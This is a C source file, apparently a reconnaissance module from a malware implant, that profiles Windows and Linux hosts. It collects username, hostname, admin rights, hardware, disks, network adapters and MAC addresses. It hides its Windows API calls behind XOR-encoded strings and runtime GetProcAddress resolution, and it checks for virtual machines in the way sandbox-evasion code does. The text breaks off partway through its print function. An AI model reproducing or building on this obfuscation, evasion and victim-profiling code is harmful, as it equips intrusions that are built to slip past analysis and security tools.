#include "system_info.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ============================================================================
// PLATFORM-SPECIFIC INCLUDES
// ============================================================================
#ifdef _WIN32
    #include <windows.h>
    #include <lmcons.h>
    #include <intrin.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "iphlpapi.lib")
#else
    #include <sys/utsname.h>
    #include <sys/sysinfo.h>
    #include <sys/statvfs.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <pwd.h>
    #include <mntent.h>
    #include <ifaddrs.h>
    #include <arpa/inet.h>
    #include <net/if.h>
#endif

// ============================================================================
// ENCRYPTED API STRINGS (XOR key: 0x35)
// ============================================================================

// GetVersionExA
static unsigned char encryptedGetVersionEx[] = {
    0x72, 0x50, 0x41, 0x63, 0x50, 0x47, 0x46, 0x5c, 0x5a, 0x5b, 0x70, 0x4d, 0x74, 0x35
};

// GetSystemInfo
static unsigned char encryptedGetSystemInfo[] = {
    0x72, 0x50, 0x41, 0x66, 0x4c, 0x46, 0x41, 0x50, 0x58, 0x7c, 0x5b, 0x53, 0x5a, 0x35
};

// RegOpenKeyExA
static unsigned char encryptedRegOpenKeyEx[] = {
    0x67, 0x50, 0x52, 0x7a, 0x45, 0x50, 0x5b, 0x7e, 0x50, 0x4c, 0x70, 0x4d, 0x74, 0x35
};

// RegQueryValueExA
static unsigned char encryptedRegQueryValueEx[] = {
    0x67, 0x50, 0x52, 0x64, 0x40, 0x50, 0x47, 0x4c, 0x63, 0x54, 0x59, 0x40, 0x50, 0x70, 0x4d, 0x74, 0x35
};

// RegCloseKey
static unsigned char encryptedRegCloseKey[] = {
    0x67, 0x50, 0x52, 0x76, 0x59, 0x5a, 0x46, 0x50, 0x7e, 0x50, 0x4c, 0x35
};

// GlobalMemoryStatusEx
static unsigned char encryptedGlobalMemoryStatusEx[] = {
    0x72, 0x59, 0x5a, 0x57, 0x54, 0x59, 0x78, 0x50, 0x58, 0x5a, 0x47, 0x4c, 0x66, 0x41, 0x54, 0x41, 0x40, 0x46, 0x70, 0x4d, 0x35
};

// GetLogicalDrives
static unsigned char encryptedGetLogicalDrives[] = {
    0x72, 0x50, 0x41, 0x79, 0x5a, 0x52, 0x5c, 0x56, 0x54, 0x59, 0x71, 0x47, 0x5c, 0x43, 0x50, 0x46, 0x35
};

// GetDriveTypeA
static unsigned char encryptedGetDriveType[] = {
    0x72, 0x50, 0x41, 0x71, 0x47, 0x5c, 0x43, 0x50, 0x61, 0x4c, 0x45, 0x50, 0x74, 0x35
};

// GetDiskFreeSpaceExA
static unsigned char encryptedGetDiskFreeSpaceEx[] = {
    0x72, 0x50, 0x41, 0x71, 0x5c, 0x46, 0x5e, 0x73, 0x47, 0x50, 0x50, 0x66, 0x45, 0x54, 0x56, 0x50, 0x70, 0x4d, 0x74, 0x35
};

// GetVolumeInformationA
static unsigned char encryptedGetVolumeInformation[] = {
    0x72, 0x50, 0x41, 0x63, 0x5a, 0x59, 0x40, 0x58, 0x50, 0x7c, 0x5b, 0x53, 0x5a, 0x47, 0x58, 0x54, 0x41, 0x5c, 0x5a, 0x5b, 0x74, 0x35
};

// GetAdaptersInfo
static unsigned char encryptedGetAdaptersInfo[] = {
    0x72, 0x50, 0x41, 0x74, 0x51, 0x54, 0x45, 0x41, 0x50, 0x47, 0x46, 0x7c, 0x5b, 0x53, 0x5a, 0x35
};

// AllocateAndInitializeSid
static unsigned char encryptedAllocateAndInitializeSid[] = {
    0x74, 0x59, 0x59, 0x5a, 0x56, 0x54, 0x41, 0x50, 0x74, 0x5b, 0x51, 0x7c, 0x5b, 0x5c, 0x41, 0x5c, 0x54, 0x59, 0x5c, 0x4f, 0x50, 0x66, 0x5c, 0x51, 0x35
};

// CheckTokenMembership
static unsigned char encryptedCheckTokenMembership[] = {
    0x76, 0x5d, 0x50, 0x56, 0x5e, 0x61, 0x5a, 0x5e, 0x50, 0x5b, 0x78, 0x50, 0x58, 0x57, 0x50, 0x47, 0x46, 0x5d, 0x5c, 0x45, 0x35
};

// FreeSid
static unsigned char encryptedFreeSid[] = {
    0x73, 0x47, 0x50, 0x50, 0x66, 0x5c, 0x51, 0x35
};

// GetComputerNameA
static unsigned char encryptedGetComputerName[] = {
    0x72, 0x50, 0x41, 0x76, 0x5a, 0x58, 0x45, 0x40, 0x41, 0x50, 0x47, 0x7b, 0x54, 0x58, 0x50, 0x74, 0x35
};

// GetUserNameA
static unsigned char encryptedGetUserName[] = {
    0x72, 0x50, 0x41, 0x60, 0x46, 0x50, 0x47, 0x7b, 0x54, 0x58, 0x50, 0x74, 0x35
};

// GetTickCount64
static unsigned char encryptedGetTickCount64[] = {
    0x72, 0x50, 0x41, 0x61, 0x5c, 0x56, 0x5e, 0x76, 0x5a, 0x40, 0x5b, 0x41, 0x03, 0x01, 0x35
};

// GetModuleHandleA
static unsigned char encryptedGetModuleHandleA[] = {
    0x72, 0x50, 0x41, 0x78, 0x5a, 0x51, 0x40, 0x59, 0x50, 0x7d, 0x54, 0x5b, 0x51, 0x59, 0x50, 0x74, 0x35
};

// GetProcAddress
static unsigned char encryptedGetProcAddress[] = {
    0x72, 0x50, 0x41, 0x65, 0x47, 0x5a, 0x56, 0x74, 0x51, 0x51, 0x47, 0x50, 0x46, 0x46, 0x35
};

// kernel32.dll
static unsigned char encryptedKernel32_sys[] = {
    0x5e, 0x50, 0x47, 0x5b, 0x50, 0x59, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
};

// advapi32.dll
static unsigned char encryptedAdvapi32[] = {
    0x54, 0x51, 0x43, 0x54, 0x45, 0x5c, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
};

// iphlpapi.dll
static unsigned char encryptedIphlpapi[] = {
    0x5c, 0x45, 0x5d, 0x59, 0x45, 0x54, 0x45, 0x5c, 0x1b, 0x51, 0x59, 0x59, 0x35
};

// ============================================================================
// FUNCTION POINTER TYPEDEFS
// ============================================================================
#ifdef _WIN32
typedef BOOL (WINAPI *pGetVersionEx)(LPOSVERSIONINFO);
typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);
typedef LONG (WINAPI *pRegOpenKeyEx)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *pRegQueryValueEx)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG (WINAPI *pRegCloseKey)(HKEY);
typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef DWORD (WINAPI *pGetLogicalDrives)(void);
typedef UINT (WINAPI *pGetDriveType)(LPCSTR);
typedef BOOL (WINAPI *pGetDiskFreeSpaceEx)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef BOOL (WINAPI *pGetVolumeInformation)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *pGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
typedef BOOL (WINAPI *pAllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
typedef BOOL (WINAPI *pCheckTokenMembership)(HANDLE, PSID, PBOOL);
typedef PVOID (WINAPI *pFreeSid)(PSID);
typedef BOOL (WINAPI *pGetComputerName)(LPSTR, LPDWORD);
typedef BOOL (WINAPI *pGetUserName)(LPSTR, LPDWORD);
typedef ULONGLONG (WINAPI *pGetTickCount64)(void);

// Global function pointers (will be initialized at runtime)
pGetVersionEx myGetVersionEx = NULL;
pGetSystemInfo myGetSystemInfo = NULL;
pRegOpenKeyEx myRegOpenKeyEx = NULL;
pRegQueryValueEx myRegQueryValueEx = NULL;
pRegCloseKey myRegCloseKey = NULL;
pGlobalMemoryStatusEx myGlobalMemoryStatusEx = NULL;
pGetLogicalDrives myGetLogicalDrives = NULL;
pGetDriveType myGetDriveType = NULL;
pGetDiskFreeSpaceEx myGetDiskFreeSpaceEx = NULL;
pGetVolumeInformation myGetVolumeInformation = NULL;
pGetAdaptersInfo myGetAdaptersInfo = NULL;
pAllocateAndInitializeSid myAllocateAndInitializeSid = NULL;
pCheckTokenMembership myCheckTokenMembership = NULL;
pFreeSid myFreeSid = NULL;
pGetComputerName myGetComputerName = NULL;
pGetUserName myGetUserName = NULL;
pGetTickCount64 myGetTickCount64 = NULL;
#endif

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * Déchiffre une chaîne chiffrée avec XOR
 * @param encrypted: Tableau de bytes chiffrés
 * @param length: Longueur du tableau
 * @param key: Clé XOR
 */
static void decrypt_sysinfo(unsigned char* encrypted, size_t length, unsigned char key) {
    for (size_t i = 0; i < length; i++) {
        encrypted[i] ^= key;
    }
}

#ifdef _WIN32
/**
 * Initialise tous les pointeurs de fonctions API
 * @return 0 en cas de succès, -1 en cas d'erreur
 */
int initialize_api_functions(void) {
    printf("[DEBUG] Initializing API functions...\n");
    unsigned char key = 0x35;

    // Decrypt DLL names
    decrypt_sysinfo(encryptedKernel32_sys, sizeof(encryptedKernel32_sys), key);
    decrypt_sysinfo(encryptedAdvapi32, sizeof(encryptedAdvapi32), key);
    decrypt_sysinfo(encryptedIphlpapi, sizeof(encryptedIphlpapi), key);

    // Get DLL handles
    HMODULE hKernel32 = GetModuleHandleA((LPCSTR)encryptedKernel32_sys);
    HMODULE hAdvapi32 = LoadLibraryA((LPCSTR)encryptedAdvapi32);  // Changed to LoadLibraryA
    HMODULE hIphlpapi = LoadLibraryA((LPCSTR)encryptedIphlpapi);

    if (!hKernel32) {
        printf("[ERROR] Failed to get kernel32.dll handle\n");
        return -1;
    }
    if (!hAdvapi32) {
        printf("[ERROR] Failed to load advapi32.dll: %lu\n", GetLastError());
        return -1;
    }
    if (!hIphlpapi) {
        printf("[ERROR] Failed to load iphlpapi.dll: %lu\n", GetLastError());
        return -1;
    }

    // Decrypt function names
    decrypt_sysinfo(encryptedGetVersionEx, sizeof(encryptedGetVersionEx), key);
    decrypt_sysinfo(encryptedGetSystemInfo, sizeof(encryptedGetSystemInfo), key);
    decrypt_sysinfo(encryptedRegOpenKeyEx, sizeof(encryptedRegOpenKeyEx), key);
    decrypt_sysinfo(encryptedRegQueryValueEx, sizeof(encryptedRegQueryValueEx), key);
    decrypt_sysinfo(encryptedRegCloseKey, sizeof(encryptedRegCloseKey), key);
    decrypt_sysinfo(encryptedGlobalMemoryStatusEx, sizeof(encryptedGlobalMemoryStatusEx), key);
    decrypt_sysinfo(encryptedGetLogicalDrives, sizeof(encryptedGetLogicalDrives), key);
    decrypt_sysinfo(encryptedGetDriveType, sizeof(encryptedGetDriveType), key);
    decrypt_sysinfo(encryptedGetDiskFreeSpaceEx, sizeof(encryptedGetDiskFreeSpaceEx), key);
    decrypt_sysinfo(encryptedGetVolumeInformation, sizeof(encryptedGetVolumeInformation), key);
    decrypt_sysinfo(encryptedGetAdaptersInfo, sizeof(encryptedGetAdaptersInfo), key);
    decrypt_sysinfo(encryptedAllocateAndInitializeSid, sizeof(encryptedAllocateAndInitializeSid), key);
    decrypt_sysinfo(encryptedCheckTokenMembership, sizeof(encryptedCheckTokenMembership), key);
    decrypt_sysinfo(encryptedFreeSid, sizeof(encryptedFreeSid), key);
    decrypt_sysinfo(encryptedGetComputerName, sizeof(encryptedGetComputerName), key);
    decrypt_sysinfo(encryptedGetUserName, sizeof(encryptedGetUserName), key);
    decrypt_sysinfo(encryptedGetTickCount64, sizeof(encryptedGetTickCount64), key);

    // Resolve function addresses from kernel32.dll
    myGetVersionEx = (pGetVersionEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGetVersionEx);
    myGetSystemInfo = (pGetSystemInfo)GetProcAddress(hKernel32, (LPCSTR)encryptedGetSystemInfo);
    myGlobalMemoryStatusEx = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGlobalMemoryStatusEx);
    myGetLogicalDrives = (pGetLogicalDrives)GetProcAddress(hKernel32, (LPCSTR)encryptedGetLogicalDrives);
    myGetDriveType = (pGetDriveType)GetProcAddress(hKernel32, (LPCSTR)encryptedGetDriveType);
    myGetDiskFreeSpaceEx = (pGetDiskFreeSpaceEx)GetProcAddress(hKernel32, (LPCSTR)encryptedGetDiskFreeSpaceEx);
    myGetVolumeInformation = (pGetVolumeInformation)GetProcAddress(hKernel32, (LPCSTR)encryptedGetVolumeInformation);
    myGetComputerName = (pGetComputerName)GetProcAddress(hKernel32, (LPCSTR)encryptedGetComputerName);
    myGetTickCount64 = (pGetTickCount64)GetProcAddress(hKernel32, (LPCSTR)encryptedGetTickCount64);

    // Resolve function addresses from advapi32.dll
    myGetUserName = (pGetUserName)GetProcAddress(hAdvapi32, (LPCSTR)encryptedGetUserName);  // Moved to advapi32
    myRegOpenKeyEx = (pRegOpenKeyEx)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegOpenKeyEx);
    myRegQueryValueEx = (pRegQueryValueEx)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegQueryValueEx);
    myRegCloseKey = (pRegCloseKey)GetProcAddress(hAdvapi32, (LPCSTR)encryptedRegCloseKey);
    myAllocateAndInitializeSid = (pAllocateAndInitializeSid)GetProcAddress(hAdvapi32, (LPCSTR)encryptedAllocateAndInitializeSid);
    myCheckTokenMembership = (pCheckTokenMembership)GetProcAddress(hAdvapi32, (LPCSTR)encryptedCheckTokenMembership);
    myFreeSid = (pFreeSid)GetProcAddress(hAdvapi32, (LPCSTR)encryptedFreeSid);

    // Resolve function addresses from iphlpapi.dll
    myGetAdaptersInfo = (pGetAdaptersInfo)GetProcAddress(hIphlpapi, (LPCSTR)encryptedGetAdaptersInfo);

    // Verify all functions were loaded
    if (!myGetVersionEx || !myGetSystemInfo || !myRegOpenKeyEx || !myRegQueryValueEx ||
        !myRegCloseKey || !myGlobalMemoryStatusEx || !myGetLogicalDrives || !myGetDriveType ||
        !myGetDiskFreeSpaceEx || !myGetVolumeInformation || !myGetAdaptersInfo ||
        !myAllocateAndInitializeSid || !myCheckTokenMembership || !myFreeSid ||
        !myGetComputerName || !myGetUserName || !myGetTickCount64) {
        printf("[ERROR] Failed to load one or more API functions:\n");
        if (!myGetVersionEx) printf("  - myGetVersionEx is NULL\n");
        if (!myGetSystemInfo) printf("  - myGetSystemInfo is NULL\n");
        if (!myRegOpenKeyEx) printf("  - myRegOpenKeyEx is NULL\n");
        if (!myRegQueryValueEx) printf("  - myRegQueryValueEx is NULL\n");
        if (!myRegCloseKey) printf("  - myRegCloseKey is NULL\n");
        if (!myGlobalMemoryStatusEx) printf("  - myGlobalMemoryStatusEx is NULL\n");
        if (!myGetLogicalDrives) printf("  - myGetLogicalDrives is NULL\n");
        if (!myGetDriveType) printf("  - myGetDriveType is NULL\n");
        if (!myGetDiskFreeSpaceEx) printf("  - myGetDiskFreeSpaceEx is NULL\n");
        if (!myGetVolumeInformation) printf("  - myGetVolumeInformation is NULL\n");
        if (!myGetAdaptersInfo) printf("  - myGetAdaptersInfo is NULL\n");
        if (!myAllocateAndInitializeSid) printf("  - myAllocateAndInitializeSid is NULL\n");
        if (!myCheckTokenMembership) printf("  - myCheckTokenMembership is NULL\n");
        if (!myFreeSid) printf("  - myFreeSid is NULL\n");
        if (!myGetComputerName) printf("  - myGetComputerName is NULL\n");
        if (!myGetUserName) printf("  - myGetUserName is NULL\n");
        if (!myGetTickCount64) printf("  - myGetTickCount64 is NULL\n");
        return -1;
    }

    printf("[DEBUG] All API functions loaded successfully\n");
    return 0;
}
#endif

// ============================================================================
// ARCHITECTURE DETECTION
// ============================================================================
Architecture detect_architecture(void) {
    #if defined(__x86_64__) || defined(_M_X64) || defined(__amd64__)
        return ARCH_X86_64;
    #elif defined(__i386__) || defined(_M_IX86)
        return ARCH_X86;
    #elif defined(__aarch64__) || defined(_M_ARM64)
        return ARCH_ARM64;
    #elif defined(__arm__) || defined(_M_ARM)
        return ARCH_ARM;
    #elif defined(__mips__)
        return ARCH_MIPS;
    #elif defined(__powerpc__) || defined(__ppc__)
        return ARCH_PPC;
    #else
        return ARCH_UNKNOWN;
    #endif
}

const char* architecture_to_string(Architecture arch) {
    switch (arch) {
        case ARCH_X86:      return "x86 (32-bit)";
        case ARCH_X86_64:   return "x86_64 (64-bit)";
        case ARCH_ARM:      return "ARM (32-bit)";
        case ARCH_ARM64:    return "ARM64 (64-bit)";
        case ARCH_MIPS:     return "MIPS";
        case ARCH_PPC:      return "PowerPC";
        default:            return "Unknown";
    }
}

// ============================================================================
// OS DETECTION
// ============================================================================
 OperatingSystem detect_os(void) {
    #ifdef _WIN32
        return OS_WINDOWS;
    #elif defined(__linux__)
        return OS_LINUX;
    #elif defined(__APPLE__) || defined(__MACH__)
        return OS_MACOS;
    #elif defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
        return OS_BSD;
    #else
        return OS_UNKNOWN;
    #endif
}

const char* os_to_string(OperatingSystem os) {
    switch (os) {
        case OS_WINDOWS:    return "Windows";
        case OS_LINUX:      return "Linux";
        case OS_MACOS:      return "macOS";
        case OS_BSD:        return "BSD";
        default:            return "Unknown";
    }
}

// ============================================================================
// WINDOWS-SPECIFIC IMPLEMENTATIONS (OBFUSCATED)
// ============================================================================
#ifdef _WIN32

static void get_windows_version(char* buffer, size_t size) {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    #pragma warning(disable: 4996)
    if (myGetVersionEx((OSVERSIONINFO*)&osvi)) {
        snprintf(buffer, size, "Windows %lu.%lu Build %lu",
                osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    } else {
        snprintf(buffer, size, "Windows (version unknown)");
    }
    #pragma warning(default: 4996)
}

static void get_windows_cpu_info(SystemInfo* info) {
    SYSTEM_INFO sysInfo;
    myGetSystemInfo(&sysInfo);

    info->nb_processors = sysInfo.dwNumberOfProcessors;
    info->nb_logical_cores = sysInfo.dwNumberOfProcessors;

    // Get CPU name from registry
    HKEY hKey;
    char cpuBrand[256] = "Unknown CPU";
    DWORD size = sizeof(cpuBrand);

    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE,
                     "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        myRegQueryValueEx(hKey, "ProcessorNameString", NULL, NULL,
                       (LPBYTE)cpuBrand, &size);
        myRegCloseKey(hKey);
    }

    strncpy(info->cpu_model, cpuBrand, sizeof(info->cpu_model) - 1);
}

static void get_windows_memory_info(SystemInfo* info) {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    myGlobalMemoryStatusEx(&memStatus);

    info->total_ram_mb = memStatus.ullTotalPhys / (1024 * 1024);
    info->available_ram_mb = memStatus.ullAvailPhys / (1024 * 1024);
    info->used_ram_mb = info->total_ram_mb - info->available_ram_mb;
    info->ram_usage_percent = (int)memStatus.dwMemoryLoad;
}

static void get_windows_disk_info(SystemInfo* info) {
    DWORD drives = myGetLogicalDrives();
    info->nb_disks = 0;

    for (int i = 0; i < 26 && info->nb_disks < MAX_DISKS; i++) {
        if (drives & (1 << i)) {
            char drive[4] = {(char)('A' + i), ':', '\\', '\0'};
            UINT driveType = myGetDriveType(drive);

            if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
                ULARGE_INTEGER freeBytesAvailable, totalBytes, freeBytes;

                if (myGetDiskFreeSpaceEx(drive, &freeBytesAvailable,
                                      &totalBytes, &freeBytes)) {
                    DiskInfo* disk = &info->disks[info->nb_disks];
                    snprintf(disk->name, sizeof(disk->name), "%c:", 'A' + i);
                    snprintf(disk->mount_point, sizeof(disk->mount_point), "%s", drive);
                    disk->total_space = totalBytes.QuadPart;
                    disk->free_space = freeBytes.QuadPart;
                    disk->available_space = freeBytesAvailable.QuadPart;

                    char volumeName[MAX_PATH];
                    char fsName[MAX_PATH];
                    if (myGetVolumeInformation(drive, volumeName, MAX_PATH, NULL,
                                            NULL, NULL, fsName, MAX_PATH)) {
                        strncpy(disk->filesystem, fsName, sizeof(disk->filesystem) - 1);
                    }

                    info->nb_disks++;
                }
            }
        }
    }
}

static void get_windows_network_info(SystemInfo* info) {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufferSize = sizeof(adapterInfo);

    info->nb_interfaces = 0;

    if (myGetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;

        while (adapter && info->nb_interfaces < MAX_INTERFACES) {
            NetworkInterface* iface = &info->interfaces[info->nb_interfaces];

            strncpy(iface->name, adapter->AdapterName, sizeof(iface->name) - 1);
            strncpy(iface->ip_address, adapter->IpAddressList.IpAddress.String,
                   sizeof(iface->ip_address) - 1);

            snprintf(iface->mac_address, sizeof(iface->mac_address),
                    "%02X:%02X:%02X:%02X:%02X:%02X",
                    adapter->Address[0], adapter->Address[1], adapter->Address[2],
                    adapter->Address[3], adapter->Address[4], adapter->Address[5]);

            iface->is_up = (strcmp(iface->ip_address, "0.0.0.0") != 0);

            info->nb_interfaces++;
            adapter = adapter->Next;
        }
    }
}

static int check_windows_admin(void) {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (myAllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                 &adminGroup)) {
        myCheckTokenMembership(NULL, adminGroup, &isAdmin);
        myFreeSid(adminGroup);
    }

    return isAdmin;
}

// ============================================================================
// LINUX-SPECIFIC IMPLEMENTATIONS
// ============================================================================
#else

static void get_linux_version(char* buffer, size_t size) {
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        snprintf(buffer, size, "%s %s", unameData.sysname, unameData.release);
    } else {
        snprintf(buffer, size, "Linux (version unknown)");
    }
}

static void get_linux_cpu_info(SystemInfo* info) {
    FILE* fp = fopen("/proc/cpuinfo", "r");
    if (!fp) return;

    char line[256];
    int processor_count = 0;

    info->nb_processors = sysconf(_SC_NPROCESSORS_ONLN);
    info->nb_logical_cores = info->nb_processors;

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "model name", 10) == 0) {
            char* colon = strchr(line, ':');
            if (colon && strlen(info->cpu_model) == 0) {
                colon += 2;
                colon[strcspn(colon, "\n")] = 0;
                strncpy(info->cpu_model, colon, sizeof(info->cpu_model) - 1);
            }
        } else if (strncmp(line, "cpu MHz", 7) == 0) {
            char* colon = strchr(line, ':');
            if (colon && info->cpu_frequency_mhz == 0) {
                info->cpu_frequency_mhz = (uint64_t)atof(colon + 1);
            }
        }
    }

    fclose(fp);
}

static void get_linux_memory_info(SystemInfo* info) {
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        info->total_ram_mb = si.totalram * si.mem_unit / (1024 * 1024);
        info->available_ram_mb = si.freeram * si.mem_unit / (1024 * 1024);
        info->used_ram_mb = info->total_ram_mb - info->available_ram_mb;

        if (info->total_ram_mb > 0) {
            info->ram_usage_percent = (int)((info->used_ram_mb * 100) / info->total_ram_mb);
        }

        info->uptime_seconds = si.uptime;
    }
}

static void get_linux_disk_info(SystemInfo* info) {
    FILE* fp = fopen("/proc/mounts", "r");
    if (!fp) return;

    struct mntent* ent;
    info->nb_disks = 0;

    while ((ent = getmntent(fp)) != NULL && info->nb_disks < MAX_DISKS) {
        // Skip virtual filesystems
        if (strncmp(ent->mnt_fsname, "/dev/", 5) != 0) continue;
        if (strcmp(ent->mnt_type, "swap") == 0) continue;

        struct statvfs vfs;
        if (statvfs(ent->mnt_dir, &vfs) == 0) {
            DiskInfo* disk = &info->disks[info->nb_disks];

            strncpy(disk->name, ent->mnt_fsname, sizeof(disk->name) - 1);
            strncpy(disk->mount_point, ent->mnt_dir, sizeof(disk->mount_point) - 1);
            strncpy(disk->filesystem, ent->mnt_type, sizeof(disk->filesystem) - 1);

            disk->total_space = vfs.f_blocks * vfs.f_frsize;
            disk->free_space = vfs.f_bfree * vfs.f_frsize;
            disk->available_space = vfs.f_bavail * vfs.f_frsize;

            info->nb_disks++;
        }
    }

    fclose(fp);
}

static void get_linux_network_info(SystemInfo* info) {
    struct ifaddrs* ifaddr;
    info->nb_interfaces = 0;

    if (getifaddrs(&ifaddr) == -1) return;

    for (struct ifaddrs* ifa = ifaddr; ifa != NULL && info->nb_interfaces < MAX_INTERFACES;
         ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        int family = ifa->ifa_addr->sa_family;
        if (family == AF_INET) {
            NetworkInterface* iface = &info->interfaces[info->nb_interfaces];

            strncpy(iface->name, ifa->ifa_name, sizeof(iface->name) - 1);

            char host[NI_MAXHOST];
            if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                           host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST) == 0) {
                strncpy(iface->ip_address, host, sizeof(iface->ip_address) - 1);
            }

            iface->is_up = (ifa->ifa_flags & IFF_UP) != 0;

            // Try to get MAC address
            char mac_path[256];
            snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", ifa->ifa_name);
            FILE* mac_file = fopen(mac_path, "r");
            if (mac_file) {
                fgets(iface->mac_address, sizeof(iface->mac_address), mac_file);
                iface->mac_address[strcspn(iface->mac_address, "\n")] = 0;
                fclose(mac_file);
            }

            info->nb_interfaces++;
        }
    }

    freeifaddrs(ifaddr);
}

static int check_linux_admin(void) {
    return (geteuid() == 0);
}

#endif

// ============================================================================
// VM DETECTION
// ============================================================================
static int detect_vm(void) {
    #ifdef _WIN32
    // Check for VMware, VirtualBox, etc.
    HKEY hKey;
    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char manufacturer[256];
        DWORD size = sizeof(manufacturer);
        if (myRegQueryValueEx(hKey, "SystemManufacturer", NULL, NULL,
                           (LPBYTE)manufacturer, &size) == ERROR_SUCCESS) {
            myRegCloseKey(hKey);
            if (strstr(manufacturer, "VMware") || strstr(manufacturer, "VirtualBox") ||
                strstr(manufacturer, "QEMU") || strstr(manufacturer, "Xen")) {
                return 1;
            }
        }
        myRegCloseKey(hKey);
    }
    #else
    // Check DMI information
    FILE* fp = fopen("/sys/class/dmi/id/product_name", "r");
    if (fp) {
        char product[256];
        if (fgets(product, sizeof(product), fp)) {
            fclose(fp);
            if (strstr(product, "VMware") || strstr(product, "VirtualBox") ||
                strstr(product, "QEMU") || strstr(product, "KVM")) {
                return 1;
            }
        } else {
            fclose(fp);
        }
    }
    #endif

    return 0;
}

// ============================================================================
// MAIN COLLECTION FUNCTION
// ============================================================================
int collect_system_info(SystemInfo* info) {
    if (!info) return -1;

    memset(info, 0, sizeof(SystemInfo));

    #ifdef _WIN32
    // Initialize obfuscated API functions first
    if (initialize_api_functions() != 0) {
        return -1;
    }
    #endif

    // Basic info
    info->architecture = detect_architecture();
    info->os = detect_os();

    #ifdef _WIN32
    get_windows_version(info->os_version, sizeof(info->os_version));
    DWORD size = sizeof(info->hostname);
    myGetComputerName(info->hostname, &size);
    size = UNLEN + 1;
    myGetUserName(info->username, &size);
    info->is_admin = check_windows_admin();
    info->uptime_seconds = myGetTickCount64() / 1000;

    get_windows_cpu_info(info);
    get_windows_memory_info(info);
    get_windows_disk_info(info);
    get_windows_network_info(info);
    #else
    get_linux_version(info->os_version, sizeof(info->os_version));
    gethostname(info->hostname, sizeof(info->hostname));

    struct passwd* pw = getpwuid(geteuid());
    if (pw) {
        strncpy(info->username, pw->pw_name, sizeof(info->username) - 1);
    }

    info->is_admin = check_linux_admin();

    get_linux_cpu_info(info);
    get_linux_memory_info(info);
    get_linux_disk_info(info);
    get_linux_network_info(info);
    #endif

    info->is_vm = detect_vm();

    return 0;
}

// ============================================================================
// PRINT FUNCTION
// ============================================================================
void print_system_info(const SystemInfo* info) {
    if (!info) return;

    printf("\n========================================\n");
    printf("         SYSTEM INFORMATION\n");
    printf("========================================\n\n");

    printf("[+] SYSTEM\n");
    printf("    Architecture:    %s\n", architecture_to_string(info->architecture));
    printf("    OS:              %s\n", os_to_string(info->os));
    printf("    Version:         %s\n", info->os_version);
    printf("    Hostname:        %s\n", info->hostname);
    printf("    Username:        %s\n", info->username);
    printf("    Admin/Root:      %s\n", info->is_admin ? "Yes" : "No");
    printf("    Virtual Machine: %s\n", info->is_vm ? "Yes" : "No");
    printf("    Uptime:          %llu seconds\n\n", (unsigned long long)info->uptime_seconds);

    printf("[+] CPU\n");
    printf("    Model:           %s\n", info->cpu_model);
    printf("    Processors:      %d\n", info->nb_processors);
    printf("    Logical Cores:   %d\n", info->nb_logical_cores);
    if (info->cpu_frequency_mhz > 0) {
        printf("    Frequency:       %llu MHz\n", (unsigned long long)info->cpu_frequency_mhz);
    }
    printf("\n");

    printf("[+] MEMORY\n");
    printf("    Total RAM:       %llu MB\n", (unsigned long long)info->total_ram_mb);
    printf("    Used RAM:        %llu MB\n", (unsigned long long)info->used_ram_mb);
    printf("    Available RAM:   %llu MB\n", (unsigned long long)info->available_ram_mb);
    printf("    Usage:           %d%%\n\n", info->ram_usage_percent);

    printf("[+] DISKS (%d total)\n", info->nb_disks);
    for (int i = 0; i < info->nb_disks; i++) {
        const DiskInfo* disk = &info->disks[i];
        printf("    [%d] %s (%s)\n", i, disk->name, disk->mount_point);
